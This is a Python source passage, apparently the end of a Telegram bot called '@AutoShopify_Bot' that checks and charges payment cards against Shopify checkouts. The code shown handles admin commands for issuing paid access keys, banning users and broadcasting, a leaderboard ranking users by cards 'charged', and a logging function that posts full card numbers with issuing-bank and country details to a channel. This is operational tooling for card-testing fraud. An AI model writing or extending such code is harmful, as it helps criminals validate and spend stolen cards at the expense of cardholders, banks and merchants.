@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/key count days`")
    
    try:
        count = int(parts[1])
        days = int(parts[2])
        
        if count > 20:
            return await event.reply(f"{WARNING_EMOJI} **Max 20 keys at once!**")
        
        keys_data = await load_json(KEYS_FILE)
        keys = []
        
        for _ in range(count):
            key = generate_key()
            keys_data[key] = {'days': days, 'used': False, 'created_at': datetime.datetime.now().isoformat()}
            keys.append(key)
        
        await save_json(KEYS_FILE, keys_data)
        
        keys_text = "\n".join([f"{KEY_EMOJI} `{k}`" for k in keys])
        await event.reply(f"{CHECKED_EMOJI} **Generated {count} keys for {days} days!**\n\n{keys_text}", parse_mode='html')
    except:
        await event.reply(f"{DECLINED_EMOJI} **Invalid input!**")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/ban user_id`")
    
    try:
        user_id = int(parts[1])
        await ban_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} **User {user_id} banned!**")
    except:
        await event.reply(f"{DECLINED_EMOJI} **Invalid user ID!**")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/unban user_id`")
    
    try:
        user_id = int(parts[1])
        await unban_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} **User {user_id} unbanned!**")
    except:
        await event.reply(f"{DECLINED_EMOJI} **Invalid user ID!**")

@client.on(events.NewMessage(pattern='/stats'))
async def bot_stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    premium = await load_json(PREMIUM_FILE)
    stats = await load_json(STATS_FILE)
    keys = await load_json(KEYS_FILE)
    
    total_users = len(stats)
    total_premium = len(premium)
    total_checked = sum(s['checked'] for s in stats.values())
    total_charged = sum(s['charged'] for s in stats.values())
    total_approved = sum(s['approved'] for s in stats.values())
    
    # Get top 10 users by charged
    top_users = sorted(stats.items(), key=lambda x: x[1]['charged'], reverse=True)[:10]
    
    message = f"""{STATS_EMOJI} **Bot Statistics** {STATS_EMOJI}

👤 **Users:** {total_users}
💎 **Premium:** {total_premium}
🔑 **Keys Generated:** {len(keys)}

📊 **Global Stats:**
• Checked: {total_checked}
• Charged: {total_charged}
• Approved: {total_approved}

**🏆 Top 10 Leaderboard**"""
    
    for i, (uid, data) in enumerate(top_users, 1):
        try:
            user = await client.get_entity(int(uid))
            name = user.first_name[:15] if user.first_name else f"User_{uid}"
            username = f"@{user.username}" if user.username else ""
        except:
            name = f"User_{uid[:8]}"
            username = ""
        
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"#{i}"
        message += f"\n\n{medal} **{name}**\n{username}\nChecked: {data['checked']}\nCharged: {data['charged']}\nApproved: {data['approved']}"
    
    message += f"\n\n━━━━━━━━━━━━━━━━━━━━━\n{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/broadcast'))
async def broadcast(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/broadcast message`")
    
    message = parts[1]
    stats = await load_json(STATS_FILE)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(f"{CHECK_EMOJI} **Broadcasting to {len(stats)} users...**")
    
    for user_id in stats.keys():
        try:
            await client.send_message(int(user_id), f"{BROADCAST_EMOJI} **Announcement**\n\n{message}")
            sent += 1
        except:
            failed += 1
        
        if (sent + failed) % 10 == 0:
            await status_msg.edit(f"{CHECK_EMOJI} **Progress:** {sent + failed}/{len(stats)}\n✅ Sent: {sent}\n❌ Failed: {failed}")
        
        await asyncio.sleep(0.5)
    
    await status_msg.edit(f"{CHECKED_EMOJI} **Broadcast Complete!**\n\n✅ Sent: {sent}\n❌ Failed: {failed}")

async def log_to_channel(user_id, card, result, brand, bin_type, level, bank, country, flag):
    if not LOG_CHANNEL_ID:
        return
    
    try:
        user = await client.get_entity(user_id)
        username = f"@{user.username}" if user.username else user.first_name
        
        message = f"""{ORDER_EMOJI} **Order Placed!** {ORDER_EMOJI}

{CARD_EMOJI} **CC:** `{card}`
{GATE_EMOJI} **Gate:** {result['gateway']}
{PRICE_EMOJI} **Price:** {result['price']}

**BIN Info:**
• **Brand:** {brand}
• **Type:** {bin_type}
• **Level:** {level}
• **Bank:** {bank}
• **Country:** {country} {flag}

{CHECKED_EMOJI} **Checked by:** {username}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
        
        await client.send_message(LOG_CHANNEL_ID, message, parse_mode='html')
    except:
        pass

# ============ MAIN ============
async def main():
    print(f"{STAR_EMOJI} Auto Shopify Bot Started!")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())